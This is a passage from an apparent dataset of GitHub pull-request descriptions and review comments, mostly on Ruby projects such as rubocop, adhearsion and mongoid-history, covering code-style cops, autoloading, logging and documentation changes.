- I've been using the proxy for surfing and it seems to generally hold up okay for popular sites","['Nice work @oxtoacart! #oxrocks', '@skivvies - aw shucks, thanks!\r\n\r\n@adamfisk - it sure was nice getting to read code that\'s comprehensible and well structured.\r\n\r\n\r\nCheers,\r\nOx\r\n\r\n------------------------------------------------------------------------------------\r\n\r\n""I love people who harness themselves, an ox to a heavy cart,\r\nwho pull like water buffalo, with massive patience,\r\nwho strain in the mud and the muck to move things forward,\r\nwho do what has to be done, again and again.""\r\n\r\n- Marge Piercy\r\n\r\n\r\n\r\n-----BEGIN PGP PUBLIC KEY BLOCK-----\r\nVersion: OpenPGP.js v.1.20130712\r\nComment: http://openpgpjs.org\r\n\r\nxsBNBFH+6NsBCACxewNAusfWlDC9ORPr9Rvt8N4pl8y0w2R33lIuDRVYDCOp\r\naROnCGK0+nLeG8AZCpktvOoApRYuVH8GL+Fk/6Nn4XBfE2abM7jGwtfjV2f2\r\nicLmwaGy8t6jkVDcv+yuflrhixFvSZuJzn6dY9b7c4jvT013JsTzs7cNwGac\r\ngCOLHun/xNuAlD5DfmqwDf7h88B75Dth1s3XMj6LDoiGVBXq8LuMm87hHreS\r\n/5CSREkeR81ihRXzfkujUxkGaURv7b1egop6BSPJEtwNuaw84OrDT6duSzBa\r\na5KoC/8WTYBEdkcNULQfULo+ZR6VdLCusNSbARz8/Dk7IBHRFcY5B/PfABEB\r\nAAHNG094IENhcnQgPG94QGdldGxhbnRlcm4ub3JnPsLAXAQQAQgAEAUCUf7o\r\n3gkQIbFNZUhWmE4AAMnCCACh7FbYaEsx1Z7WIuzEgyrKaRS4k9Fjw1BoAKAW\r\ndKOh+pkV/0r1qy2x603SOlqK7fFYwMuiPqpqF7AVQn2PchSGPEiO8d5LVJ4k\r\naWJSI/r4gPddzl3nRKkBRFxLtDGyEKXUJAZLVa/H+727W64WjI4/nmUlHbJl\r\nG4ukKHSXXcZaptGk7+OALopEGJIpfinLOciauRE6vzJp3/TW8h7PAGtpaugB\r\ny2AFU319KmDACdluR7yQjMnoNKTHy/C/KAgBkNUt3kYL8HbGsx6ciKGwkd+w\r\nVTFsaS3G+05Qm1PYZVzDBggEdcLZ0xA5BqaN55PgzLdRvZGKFyjmPsgW1HhB\r\nWAwN\r\n=iaKQ\r\n-----END PGP PUBLIC KEY BLOCK-----\r\n\r\nOn Aug 12, 2013, at 4:36 PM, skivvies <notifications@github.com> wrote:\r\n\r\n> Nice work @oxtoacart! #oxrocks\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> ', 'Hey @oxtoacart thanks for all your great work on this! Merging.']"
144,adelevie/parse-ruby-client,87.0,Rcov can run only on ruby 1.8.7 see issue: https://github.com/adelevie/parse-ruby-client/issues/86,['Coverage is optional enable via ENV variable\r\n```bash\r\nCOVERAGE=true bundle exec rake\r\n```']
145,adhearsion/adhearsion,495.0,"In past discussion weve come to the conclusion that autoloading isnt adding anything to the code since we already explicitly tell the autoloader the dependencies to load. In addition, in many cases we have to eager-load. All that autoload is doing is slowing down the normal process of requiring files.

The immediate cause for this work was the fact that `require adhearsion/rspec` was failing because of autoloader failing to resolve a dependency between `Adhearsion::CallController` and `Adhearsion::CallController::Dial`.

Along the way this also fixed some other previously masked bugs:

* PunchblockPlugin was defined as inheriting from Plugin in one place and not another
* At least three classes never existed and were never referenced, but were made available via autoload:
  - Adhearsion::CallController::MenuDsl::Exceptions
  - Adhearsion::Dispatcher
  - Adhearsion::Plugin::Configuration","[""Could you say something more about the motivation for this? I get that it's preferable to move the pain of loading these up-front before calls get processed, but there has to have been something more specific to trigger this PR. I'd like to see that in the commit message (and for this to be squashed before merging).\r\n\r\nAdditionally, I wonder if this is introducing unnecessary pain loading code that might not be used in any individual application? There's certainly room for things like generators not to be loaded except when they're used (by the CLI)."", ""I started down this path because the autoloaders were apparently failing to work out a dependency between `CallController` and `CallController::Dial` when I was attempting to `require 'adhearsion/rspec'`.  Also, we've talked about getting rid of autoload in the past, so I just used that as the excuse."", 'So I\'d like to see some record of that failure (an issue tagged in this commit\'s message or in the commit message itself). It may seem like nit-picking, but I\'m becoming decreasingly tolerant of commit messages which do not appropriately communicate motivation for their change and the confusion they leave behind when someone asks ""why?"" in the future.', ""@benlangfeld I've fed the hounds. Ready to merge?"", 'Travis says no...', 'Those specs are also failing on develop ', 'Then go ahead and merge.']"
146,adhearsion/adhearsion,518.0,I took a look at all the places we used `logger.info` to make sure the messages contained useful information. This is important because INFO is the default level for production apps.,"[""So I dunno what's up with JRuby, but Travis thinks it's really broken.  None of those errors are from these changes though."", 'This is good to go other than JRuby.', ""Just that one complaint where I think you removed useful info. Once that's resolved, a squash and then merge would be fine :)"", 'Log message adjusted, rebased & squashed']"
147,apache/tajo,156.0,TAJO-1062: Update TSQL documentation,"[""Hi @mhthanh \r\n\r\nThank you for your detailed review.\r\nI've just updated the patch by your opinions.\r\nIf possible, could you check it again?\r\n\r\nThanks\r\nJaehwa"", 'Hi @blrunner,\r\nI have checked the patch again. It looks good except 2 minor typos:\r\n+ In file ""meta_command.rst"", Line 6, ""anything command"" -> ""any command""\r\n+ In file ""single_command.rst"", Line 7, ""queries separated"" -> ""queries are separated""\r\n\r\nAfter you fix these typos, you automatically get +1 from me ;-)\r\nActually, I like your patch and I think that Tajo needs many more detailed documents like this one.', ""Hi @mhthanh \r\n\r\nReally thank you for your detailed review.\r\nI've just updated it. :)\r\n"", 'The patch looks nice to me. I leaved some trivial comments.', ""Hi @hyunsik \r\n\r\nThank you for your review.\r\nI've just updated the patch.\r\nIf possible, could you check it again?"", ""Hi @hyunsik \r\n\r\nI agree with your opinion.\r\nI've just renamed the file. :)"", '+1 ship it.']"
148,aq1018/mongoid-history,131.0,"This make it possible to get specific version of an object: ```object.undo(nill, from: <version>, to: object.version)```","['\n[![Coverage Status](https://coveralls.io/builds/1740544/badge)](https://coveralls.io/builds/1740544)\n\nCoverage decreased (-0.38%) when pulling **a83e39e6c3bc201b3e49d25d9e47cdbdf646d8ec on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'This needs tests, CHANGELOG, and README updates, please. ', '\n[![Coverage Status](https://coveralls.io/builds/1759699/badge)](https://coveralls.io/builds/1759699)\n\nCoverage increased (+0.0%) when pulling **6a4a4e895535fe2c885a9f5ff11d038dd571cdd9 on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'Thank you for the heads up! Tests, CHANGELOG, and README updates added, please take a look.', ""See my comments, it's getting closer. Make sure to fix the build and once everything is cleaned up, squash your commits, please."", '\n[![Coverage Status](https://coveralls.io/builds/1760241/badge)](https://coveralls.io/builds/1760241)\n\nCoverage increased (+0.2%) to 99.405% when pulling **e4646f271fde4299cf63c9e51298ec6c88c658ad on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', '""I also would like an explicit test that undo! is just undo + save!."" \xe2\x80\x94 could you please provide an example of test you want to have for it? Thanks.', '\n[![Coverage Status](https://coveralls.io/builds/1760600/badge)](https://coveralls.io/builds/1760600)\n\nCoverage increased (+0.0%) when pulling **53261d83f498d982a6d14144b6909693793aa281 on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'This is good, squash your commits and this is good to go.\r\n\r\nThe undo/save test would still be nice. I am thinking something like this:\r\n\r\n```ruby\r\nit ""implements undo! in terms of undo and save!"" do\r\n    commment = ...\r\n    expect(comment).to receive(:undo)\r\n    expect(comment).to receive(:save!)\r\n    comment.undo! ...\r\nend\r\n```', '\n[![Coverage Status](https://coveralls.io/builds/1761928/badge)](https://coveralls.io/builds/1761928)\n\nCoverage increased (+0.0%) when pulling **9ae9b50f06eea6ca4c39f1dda1ae8ab634f500bd on alexkravets:master** into **e7c13fb6b0a26ac7bb8142dff1f72a3c714ed876 on aq1018:master**.\n', 'Merged, thank you.']"
149,asciidoctor/asciidoctor,181.0,"- put all code inside an Asciidoctor module block
- moved debug operations into Debug submodule
- optimized block matching by using a single regexp
- added support for fenced code blocks (issue #118)

I anticipate this pull request will cause a (potentially tricky) merge conflict after the ones submitted in the last day are merged. Just let me know when you get those done and I'll rebase this one.","['This whole thing is so much win.', ':+1: ', 'I did a force push with the requested changes to sync the branch w/ upstream/master', 'Are we good to go on this?']"
150,asm-helpful/helpful-web,138.0,"Closes https://assemblymade.com/helpful/wips/295

This also merges in @galkon's work from https://github.com/asm-helpful/helpful-web/pull/137","[""Cheers for making those changes to the buttons. I was unaware you could use\narchive and unarchive as attributes to change the archived field. We may as\nwell of made it a status field rather than a boolean :p\n\nOn Friday, March 14, 2014, Patrick Van Stee\n<notifications@github.com<javascript:_e(%7B%7D,'cvml','notifications@github.com');>>\nwrote:\n\n> Closes https://assemblymade.com/helpful/wips/295\n>\n> This also merges in @galkon <https://github.com/galkon>'s work from #137<https://github.com/asm-helpful/helpful-web/pull/137>\n> ------------------------------\n> You can merge this Pull Request by running\n>\n>   git pull https://github.com/vanstee/helpful-web inbox-queue\n>\n> Or view, comment on, or merge it at:\n>\n>   https://github.com/asm-helpful/helpful-web/pull/138\n> Commit Summary\n>\n>    - Removed random inline javascript that did not look like it was doing\n>    anything important. Added conditional logic around showing different\n>    buttons when the conversation is archived and unarchived.\n>    - Remove unused code\n>    - Create a service object to handle conversation actions\n>    - Install pry for debugging\n>    - Use timecop for time related tests\n>    - Wrap up conversation actions in some tests\n>    - Use the conversation manager to handle simple actions\n>    - Order conversations in the inbox like a queue\n>    - Merge branch 'pull/137' into inbox-queue\n>    - Fix up archive and unarchive buttons\n>    - Reverse order of conversations\n>    - Add button to move conversations to bottom of queue\n>\n> File Changes\n>\n>    - *M* Gemfile<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-0>(2)\n>    - *M* Gemfile.lock<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-1>(10)\n>    - *M* app/assets/stylesheets/modules/conversation.css.scss<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-2>(15)\n>    - *M* app/controllers/conversations_controller.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-3>(4)\n>    - *M* app/models/conversation.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-4>(9)\n>    - *A* app/models/conversation_manager.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-5>(40)\n>    - *M* app/models/conversations_inbox.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-6>(6)\n>    - *M* app/views/conversations/_conversation.html.erb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-7>(17)\n>    - *M* app/views/conversations/_row.html.erb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-8>(28)\n>    - *A* spec/controllers/conversations_controller_spec.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-9>(58)\n>    - *M* spec/factories/users.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-10>(10)\n>    - *A* spec/models/conversation_manager_spec.rb<https://github.com/asm-helpful/helpful-web/pull/138/files#diff-11>(29)\n>\n> Patch Links:\n>\n>    - https://github.com/asm-helpful/helpful-web/pull/138.patch\n>    - https://github.com/asm-helpful/helpful-web/pull/138.diff\n>\n> --\n> Reply to this email directly or view it on GitHub<https://github.com/asm-helpful/helpful-web/pull/138>\n> .\n>""]"
151,asm-helpful/helpful-web,350.0,Automates the awarding of this: https://assembly.com/helpful/bounties/904,[]
152,attr-encrypted/attr_encrypted,137.0,reopen of https://github.com/attr-encrypted/attr_encrypted/pull/117,"['@billymonk any outstanding concerns?', ""Hi @tamird,\r\n\r\nThanks for making the changes. I'll merge in once tests are passing. Please take a look at the failing test on AR 4.\r\n\r\nLooks like it is only `test_should_set_attributes_regardless_of_arguments_order`. Maybe that was related to moving the method definition out of the if/else conditional? If that test was relying on that change then I think we should remove that test and we could introduce the change in another pull request.\r\n\r\nThanks!\r\n"", '@billymonk done', '@billymonk ping']"
153,azkaban/azkaban,362.0,"... auto-fix feature.

This pull request will add 3 additional azkaban configs:
project.validators.fix.prompt controls whether to show the auto-fix related UI
project.validators.fix.lable controls the content of the auto-fix label
project.validators.fix.link sets the link which contains the detailed information about the auto-fix feature.","['Looks good, apart from some minor comments.', 'Updated the pull request addressing these comments. ', 'Apart from minor comments, LGTM!', 'Updated the pull request.', 'LGTM!']"
154,bbatsov/rubocop,551.0,"It's quite common to make function calls such as `where({ x: 1 })`, in which case the curly braces are not required and you can write `where(x: 1)`. The `BracesInHashParameters` supports both a `required` (default) and a `none` style, keeping things consistent either way.
","[""This cop would be very useful for me! One question: should the default be `{ EnforcedStyle: none }` per the default [style guide](https://github.com/bbatsov/ruby-style-guide)?\r\n\r\n> Omit the outer braces around an implicit options hash.\r\n>\r\n```ruby\r\n# bad\r\nuser.set({ name: 'John', age: 45, permissions: { read: true } })\r\n>\r\n# good\r\nUser.set(name: 'John', age: 45, permissions: { read: true })\r\n```"", ""@dblock This cop seems like a good idea. I've added some source code comments. I agree with @fancyremarker that the default should be to not have braces. Oh, and you also need to make sure that the source code passes `rubocop`'s own inspection!"", 'Updated with all the suggested changes/fixes. Enforcing the default style of `BracesAroundHashParameters` to `none`.', ""Added a few more comments. Sorry I didn't write them all at once.\r\n\r\nI noticed you chose to stick with `required`/`none` rather than `braces`/`no_braces`. What was your motivation for that?"", 'Renamed `none` and `required` to `no_braces` and `braces`, yours is better. ', 'Updated, squashed. Please re-review. Happy to make more changes as you see fit.', 'Updated again, squashed. Not using a regexp anymore, thanks for insisting, this is a lot better.', ""@dblock :-) Code looks good now. You'll have to rebase on top of the current `master`, since there is a merge conflict right now."", ""Here're you go."", 'Thanks!']"
155,bbatsov/rubocop,869.0,"see https://github.com/bbatsov/rubocop/issues/868

Feel free to propose changes.","['\n[![Coverage Status](https://coveralls.io/builds/589755/badge)](https://coveralls.io/builds/589755)\n\nCoverage remained the same when pulling **ced0eea2a9f6a08cdf7d95701d82337e571e1a51 on geniou:nested_style** into **fbe3ed902749bb4a9b9775a4d4b97828c5f982ef on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590666/badge)](https://coveralls.io/builds/590666)\n\nCoverage remained the same when pulling **30a35a31faa5a21b32f04bf9db1fe3aac776f639 on geniou:nested_style** into **fbe3ed902749bb4a9b9775a4d4b97828c5f982ef on bbatsov:master**.\n', 'I adapted the code to make it configurable. @bbatsov please have a look.', '\n[![Coverage Status](https://coveralls.io/builds/590837/badge)](https://coveralls.io/builds/590837)\n\nCoverage remained the same when pulling **f5f673050d38b671f33feadb5a4ba19fcc83e41f on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590844/badge)](https://coveralls.io/builds/590844)\n\nCoverage remained the same when pulling **bcb70dd9c9a7ae60aaef1beafcbf1f38475a8f7a on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/590851/badge)](https://coveralls.io/builds/590851)\n\nCoverage remained the same when pulling **b7e471d62700890bbfd658bb01ace6efb3c808f9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '@bbatsov please have a look again.', '\n[![Coverage Status](https://coveralls.io/builds/591016/badge)](https://coveralls.io/builds/591016)\n\nCoverage remained the same when pulling **7f7da9bf3a65f11ce1da94b7061fbc3167bfdce5 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591036/badge)](https://coveralls.io/builds/591036)\n\nCoverage remained the same when pulling **126458b2062a201f4cb971f7db97a73389cd7084 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591089/badge)](https://coveralls.io/builds/591089)\n\nCoverage remained the same when pulling **3718dd837742219fcddc9947efb06c4a4bd5a267 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '@jonas054 @yujinakayama Remarks from you would be most welcome as well!', '@bbatsov like this?', '\n[![Coverage Status](https://coveralls.io/builds/591979/badge)](https://coveralls.io/builds/591979)\n\nCoverage remained the same when pulling **66ab985bbb05addf09a7fdda99ddb3561fa502e9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/591979/badge)](https://coveralls.io/builds/591979)\n\nCoverage remained the same when pulling **66ab985bbb05addf09a7fdda99ddb3561fa502e9 on geniou:nested_style** into **65c2390b82bdc8b973fc92963571ee73c43bcb12 on bbatsov:master**.\n', ""@jonas054 thanks for your hints. Is is fine like this?\r\n\r\nI'm not sure about the naming. I think there are no official names for these two styles. I hope `nested` and `compact` is clear enough."", 'Looks good. Just some final remarks. I noticed a couple of typos in your commit messages:\r\n\r\n* fulfill -> fulfil (I\'d rephrase this to ""Fix offenses reported by...""\r\n* alingment -> alignment\r\n\r\nI\'d also suggest to start all commit messages with an uppercase letter.', '@bbatsov sorry for the typos - now they are fixed.', 'Thanks!', '@bbatsov Thank you for your patience!', ""@bbatsov A small heads-up. The spelling _fulfill_ is actually correct American English according to [the dictionary](http://www.oxforddictionaries.com/definition/american_english/fulfill). It doesn't matter now since @geniou rephrased it, and the word doesn't occur anywhere in our code base or in any commit message.""]"
156,bbatsov/rubocop,1072.0,,"['RuboCop offenses fixed. :pensive: ', 'Seems OK to me. @yujinakayama @jonas054 What do you think?', ""I think this cop should not support auto-correction. The purpose of the cop is only to remind the user of the existence of unused arguments, and it does not know what correct code is.\r\n\r\nHere are possible cases:\r\n\r\n#### Overriding or conforming to some protocol\r\n\r\n```ruby\r\nclass SomeBaseClass\r\n  def some_method(foo, bar)\r\n    puts foo, bar\r\n  end\r\nend\r\n\r\nclass SomeClass < SomeBaseClass\r\n  def some_method(foo, bar) # This should be `_bar`\r\n    puts foo\r\n  end\r\nend\r\n```\r\n\r\n#### Typos\r\n\r\n```ruby\r\ndef some_method(foo, ber) # This should be `bar`.\r\n  puts bar\r\nend\r\n\r\ndef some_method(foo, bar)\r\n  puts ber # This should be `bar`.\r\nend\r\n```\r\n\r\n#### Definitely useless arguments\r\n\r\n```ruby\r\ndef some_method(foo, bar) # This `bar` can be removed.\r\n  puts foo\r\nend\r\n\r\nsome_method('FOO', 'BAR') # This invocation also needs to be updated.\r\n```\r\n\r\nSo, I think the auto-correction is actually not correcting the issues, it's suppressing them.\r\n"", '@yujinakayama I see your point, at the same time auto-correct for these cops helps bringing a code-base to explicitly conform to the them, this might not be ideal, but very helpful. After the running the auto-correct developers finding arguments prefixed with `_` might consider removing them, and altering their callers.', ""@bbatsov I'd appreciate some suggestions for more descriptive example titles."", '> this might not be ideal, but very helpful. After the running the auto-correct developers finding arguments prefixed with _ might consider removing them, and altering their callers.\r\n\r\nI think tools should lead users to the appropriate way by its implementation. The offense for the unused arguments is the best chance to notice the issues. Once they are suppressed, users need to _carefully_ check them again. RuboCop is a tool to find out _careless_ issues.', ""@yujinakayama Yeah, I guess the question is whether the appropriate way is the idealistic or pragmatic one. Generally I'd say that auto-correct would be the pragmatic way, except for the case when it makes semantic changes (see #1047)."", ""I think you have  always the chance to decide if you want to autocorrect or not, and afterwards you see the changes and can decide if you can keep them or have to change something. So I'm I'm favor of it."", ""@yujinakayama As usual, I'm with you 100%. That said, I recognise that some people don't view the situation like we do and we should cater to their needs as well. I'm thinking that the levels of auto-correct proposed in #950 will largely solve such problems. I'm also thinking we can additionally introduce a global cop config that can disable auto-correct (say `EnableAutocorrect`).\r\n\r\nCops like those two in question will support auto-correct, but have it disabled by default. Generally speaking, lint cops rarely have a straight-forward auto-correction path.\r\n\r\nHow does this sound? /cc @jonas054 "", ""@bbatsov \r\n\r\n> I'm thinking that the levels of auto-correct proposed in #950 will largely solve such problems.\r\n\r\nIt seems to be reasonable, since my biggest concern is that this auto-correction makes average users (who don't know the auto-correction behaves like that) overlook the underlying issues. Probably the aggressive auto-correction mode should be designed for the opt-out adjustment approach as @hannestyden said and it should output some warnings on run."", ""Yep, that sounds totally reasonable. I'll merge this PR now and check how's the progress on #950."", 'For me the only important issue is that there is a possibility to run pragmatic auto-correct. The use-case for me is (and has already been) making a large code base that has been developed without these style guides (or without having them properly enforced). In that case I find it better that the lingering `_`-prefixed variables are cleaned up as they are found.\r\n\r\nOTOH, in a project where this style is actively enforced I totally agree with @yujinakayama.\r\n\r\nGiven that there is support for different levels of auto-correct, I suggest that auto-correct should be **opt-in**, and that instructions or hints how to enable the particular level is communicated, e.g.\r\n\r\n> `# Cop supports --auto-correct agressive`\r\n\r\nor similar.\r\n\r\n(While writing this the PR was merged. :smile:)\r\n\r\n']"
157,bbatsov/rubocop,1236.0,"Currently, the AndOr cop bans the use of keywords 'and' and 'or'
completely. This patch adds a configuration option `OnlyCheckConditionals`
which when set, restricts the AndOr cop to only conditionals.","['First draft. Let me know if there is any thing I should change.', 'Good start, but testing needs to be improved. Also, you need to add the new parameter in `config/default.yml` and update the changelog.', '@jonas054 I have updated with the suggested changes and more tests', '\n[![Coverage Status](https://coveralls.io/builds/1029164/badge)](https://coveralls.io/builds/1029164)\n\nCoverage decreased (-0.05%) when pulling **11b3b2517535b459e38fefb2dd7c1101db7e36bd on vrthra:fix/1232/configurable_andor** into **9548befeec193d16d39a576d7744bb3bc3c831ec on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029602/badge)](https://coveralls.io/builds/1029602)\n\nCoverage decreased (-0.07%) when pulling **503bc3764c818461dcc4abc0112a2de225af7eb7 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029624/badge)](https://coveralls.io/builds/1029624)\n\nCoverage decreased (-0.05%) when pulling **f2cb07ebccb2ecc5df19eac2976b1f586f44ce08 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029692/badge)](https://coveralls.io/builds/1029692)\n\nCoverage decreased (-0.05%) when pulling **f2cb07ebccb2ecc5df19eac2976b1f586f44ce08 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029964/badge)](https://coveralls.io/builds/1029964)\n\nCoverage decreased (-0.04%) when pulling **b119a38add5d5547931cfbef3598f4a6d1c441a9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1029964/badge)](https://coveralls.io/builds/1029964)\n\nCoverage decreased (-0.04%) when pulling **b119a38add5d5547931cfbef3598f4a6d1c441a9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1030604/badge)](https://coveralls.io/builds/1030604)\n\nCoverage decreased (-0.03%) when pulling **3a1efe865cf765f0c0005194bf533cd08e276199 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1033779/badge)](https://coveralls.io/builds/1033779)\n\nCoverage decreased (-0.01%) when pulling **fc85932c2396033f7491379a4cf4218072a4b1f4 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1033851/badge)](https://coveralls.io/builds/1033851)\n\nCoverage increased (+0.0%) when pulling **b5d1c066ba3c52239a0ae0c1a210195e34119162 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/1034399/badge)](https://coveralls.io/builds/1034399)\n\nCoverage increased (+0.0%) when pulling **a21631e01c055db11f33aca6655659ebba4f1af9 on vrthra:fix/1232/configurable_andor** into **091d124726b541f8852e0d1699f8383d652fea71 on bbatsov:master**.\n', 'Looks good to me; the latest change was a massive improvement. We should have suggested them sooner. @jonas054 do you have more remarks?', ""Yes, that's much better. I'm satisfied."", 'Thanks for your work on this @vrthra!']"
158,bbatsov/rubocop,1731.0,"* https://github.com/bbatsov/rubocop/issues/1600
* https://github.com/bbatsov/ruby-style-guide/issues/162
* http://devblog.avdi.org/2011/07/26/the-procedurefunction-block-convention-in-ruby/

Add a configuration option to the `Style/Blocks` cop to permit two styles:

* `line_count_based` (the current default);
* `semantic` (the rule as described in the links above).

With semantic style enabled, this allows multi-line blocks with braces if the block is considered ""functional"". The current implementation checks whether the return value of a block is used to classify it as ""functional"". It performs the following checks:

1. Is the return value of the block being assigned?
2. Is the return value of the block sent a message?
3. Is the return value of the block the last thing in its scope?

This should cover the following semantic style use cases:

```ruby
# 1
foo = map { |x|
  x * 2
}

# 2
map { |x|
  x * 2
}.inspect

# 3
block do
  foo

  map { |x|
    x * 2
  }
end

# 3
puts map { |x|
  x * 2
}
```

Add offenses if the return value of a block is used but `do`...`end` is used instead of the intention-revealing `{`...`}`. Conversely, if the return value of a block is not used, add an offense if `{`...`}` is used instead of `do`...`end`.

As there are some methods that are functional or procedural but cannot be categorised as such from their usage alone, add configurable lists to permit methods such as `RSpec::Core::ExampleGroup.let` which is functional but appears procedural and `tap` which is procedural but appears functional. For methods which can be both functional and procedural (such as `lambda`) and cannot be categorised by usage, add a configurable list of ignored methods.

As DSLs often use `do`...`end` (e.g. `RSpec.describe`), do not add an offense if a block uses `do`...`end` even though it could potentially be the return value of its outer scope, e.g.

```ruby
RSpec.describe Foo do
  it 'blah' do
    # ...
  end
end
```","['+1', ':+1:', ':+1:\n\n\n\n\xe2\x80\x94Scott Matthewman http://matthewman.net/\n\nTwitter: @scottm\n\nTheatre news and reviews at Eye/Saw Theatre: http://eyesawtheatre.com/\n\nTwitter: @eyesawtheatre\n\n\xe2\x80\x94\n\nSent from Mailbox\n\nOn Mon, Mar 23, 2015 at 2:38 PM, Johannes Barre <notifications@github.com>\nwrote:\n\n> :+1:\n> ---\n> Reply to this email directly or view it on GitHub:\n> https://github.com/bbatsov/rubocop/pull/1731#issuecomment-85136735', 'It\'s an interesting idea, and I\'d be glad to see this functionality added, if we can sort out the problems that I see.\r\n\r\nThe first one is a big one. We must agree on what we mean by ""block""! In the example\r\n```ruby\r\nfoo = map { |x|\r\n  x * 2\r\n}\r\n```\r\nthe *block* is `{ |x| x * 2 }` and `map` is a *method*. So it\'s the return value of the `map` method that\'s assigned to `foo`, not the return value of the block, which is returned to `map` and used to put together the return value of `map` (assuming that we\'re talking about a map that\'s the same as `Enumerable#map`).\r\n\r\nIdeally, we\'d want RuboCop to examine the source code for `map` to see if it uses the return value of the block, but that\'s never going to happen as far as I can see. Too difficult. Instead we must try to guess based on what\'s available in the inspected file. When making that guess we should try to see if the method is one that we recognize from the Ruby core, the standard library, or a widely used gem. Then we know what it does with the return value of the block. Some good candidates for the white list:\r\n```\r\n    - each\r\n    - each_with_index\r\n    - each_with_object\r\n```\r\nThey don\'t use the return value, so the block is procedural in nature. Another method that currently gives a lot of false positives in the RuboCop code base is `lambda`. It\'s impossible to know if the return value is going to be used or not when the lambda (i.e., the block) is called.\r\n\r\nAnother example found in the RuboCop sources is `Benchmark.realtime`. Here it seems that we can\'t just look at the method name. The fact that it\'s called on `Benchmark` is an important clue.\r\n\r\nTo avoid false positives, it might be necessary to work with a black list rather than a white list.', ""I really like this feature and I'd definitely use it. :+1: "", 'Thanks for your feedback, @jonas054.\r\n\r\nI agree that inspecting the return value of the actual block (and not the method using it) is unfeasible and I suspect it would suffer from some of the same issues: Ruby\'s implicit return means we can\'t be certain any expression is significant even if it is the last one in its scope.\r\n\r\nMy understanding of the style (as discussed in #162) is to communicate whether the block\'s return value is significant or not: viz. is the block purely for side-effects (procedural) or producing some new value (functional):\r\n\r\n```ruby\r\n# functional\r\nbigger_numbers = numbers.map { |number|\r\n  number * 10\r\n}\r\n\r\n# procedural\r\nnames.map! do |name|\r\n  name.strip!\r\n  name.downcase!\r\nend\r\n```\r\n\r\nIt was our hope that you could interpret the usage of the return value of the method (e.g. look at the return value of a `map`) to somewhat reveal the intention of the user (rather than relying on whitelists or blacklists of methods which feels brittle).\r\n\r\nWhile this works in the simple cases, e.g.\r\n\r\n```ruby\r\nfoo = map { |x|\r\n  x * 2\r\n}\r\n\r\nmap { |x|\r\n  x * 2\r\n}.map { |y|\r\n  y - 1\r\n}\r\n\r\nfoo(map { |x|\r\n  x * 2\r\n})\r\n```\r\n\r\nThere are methods that are not correctly classified as ""functional"" or ""procedural"" purely by looking at the use of their results, e.g. `let`, `tap`:\r\n\r\n```ruby\r\nlet(:foo) {\r\n  Foo.new\r\n}\r\n# The result of `let` is seemingly discarded as it is not assigned, part of\r\n# another method call or chained but this is actually ""functional"" as it\r\n# uses `Foo.new` to define a method `foo`\r\n\r\nuser = User.new.tap do |u|\r\n         u.name = \'Alice\'\r\n       end\r\n# Here, the result of `tap` is being assigned to `user` but `tap` actually\r\n# discards the return value of its block and is purely ""procedural"", used only\r\n# for its side-effects.\r\n```\r\n\r\nThis is only a problem because we try to report offenses for incorrect brace/`do`-`end` usage and it\'s not possible to be 100% correct from usage alone.\r\n\r\nOur original intention was simply to permit Weirich style without having to disable the `Blocks` cop altogether (as is currently necessary) so I wouldn\'t be averse to being more conservative in our 